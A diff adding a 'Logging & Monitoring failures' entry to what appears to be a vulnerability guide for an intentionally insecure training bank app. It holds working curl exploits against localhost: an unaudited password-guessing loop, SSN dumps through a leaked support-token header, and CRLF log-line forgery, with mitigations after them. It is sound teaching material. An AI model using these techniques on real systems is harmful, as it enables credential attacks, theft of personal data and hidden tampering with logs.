@@ -86,6 +86,7 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
  [60]  Security misconfig — /uploads/ directory listing enabled (Ch 33)
  [61]  Vulnerable component — jQuery 1.12.4 `$()` HTML parsing → DOM XSS via ?theme= (Ch 34)
  [62]  Software & Data Integrity — POST /admin/integrity/install accepts unsigned plugin code → RCE (Ch 35)
+ [63]  Logging & Monitoring — failed logins and SSN-view actions are not audited; /admin/audit reachable by any logged-in user; CRLF log forgery via /forgot email (Ch 36)
 
 
 --------------------------------------------------------------------------------
@@ -1027,6 +1028,70 @@ MITIGATION
     `node --experimental-permission` or a child process with restricted env).
   - Authenticate the endpoint and audit-log every install with the signer
     identity (Ch 36).
+
+
+--------------------------------------------------------------------------------
+ [63] Logging & Monitoring failures
+--------------------------------------------------------------------------------
+SINKS  lib/audit.js  +  routes/auth.js  +  routes/admin.js
+TABLE  audit_log (id, user_id, action, details, created_at)
+
+Four overlapping gaps make the bank a textbook A09 target:
+
+  B-LOG-001  Failed logins are NOT audited.
+             routes/auth.js calls audit() only on success.  An
+             attacker can iterate the entire password list against a
+             single account and leave zero entries behind.
+  B-LOG-002  Reading /admin/users/:id (which returns the full row
+             including SSN and password hash) is NOT audited, and
+             /admin/users/:id/delete (account deletion) is NOT audited.
+             Mass SSN enumeration and account wiping are invisible.
+  B-LOG-003  The `details` column is built from raw request bytes.
+             A newline (or CRLF) inside the value -- e.g. in the
+             /forgot `email` parameter -- forges additional log lines
+             that the defender will read as legitimate audit entries.
+  B-LOG-004  GET /admin/audit has no role check (the surrounding
+             /admin router uses only requireSession).  Any logged-in
+             user (or anyone with the leaked X-Support-Token) can
+             read the defender's own log.
+
+EXPLOIT  (no auth needed -- support-token bypass from B-MIS-006)
+  # 10 failed login attempts, all 401, NONE recorded:
+  for i in 1 2 3 4 5 6 7 8 9 10; do
+    curl -s -o /dev/null -X POST http://localhost:3001/login \
+      -d "username=alice.chen&password=wrong$i"
+  done
+  # one success -- IS recorded
+  curl -s -o /dev/null -X POST http://localhost:3001/login \
+    -d 'username=alice.chen&password=Password123!'
+
+  # 5 SSNs dumped, NONE recorded:
+  for id in 1 2 3 4 5; do
+    curl -s -H 'X-Support-Token: ENG-OVERRIDE-2024-ALL-ACCESS' \
+      http://localhost:3001/admin/users/$id
+  done
+
+  # Defender reads /admin/audit -- they see 'login_success' and the
+  # seed row only:
+  curl -s -H 'X-Support-Token: ENG-OVERRIDE-2024-ALL-ACCESS' \
+    http://localhost:3001/admin/audit
+
+LOG INJECTION  (CRLF forgery via /forgot)
+  curl -s --data-urlencode $'email=victim@x.com\n2099-01-01T00:00:00 | 1 | login | admin login from 8.8.8.8' \
+    http://localhost:3001/forgot
+  # /admin/audit now displays a forged "admin login from 8.8.8.8"
+  # row that no one performed.
+
+MITIGATION
+  - Audit BOTH success AND failure (especially failure -- it is the
+    interesting signal).  Include actor IP and User-Agent.
+  - Sanitise log inputs.  Strip or escape \r, \n and any control
+    bytes BEFORE concatenating into the `details` field.
+  - Add a real role guard to /admin/audit (requireAdmin) AND treat the
+    audit log as append-only with periodic export to a write-once
+    store outside the app.
+  - Alert on patterns: N failed logins from one IP, M SSN reads in
+    one minute, audit_log write failures.
 
 
 ================================================================================
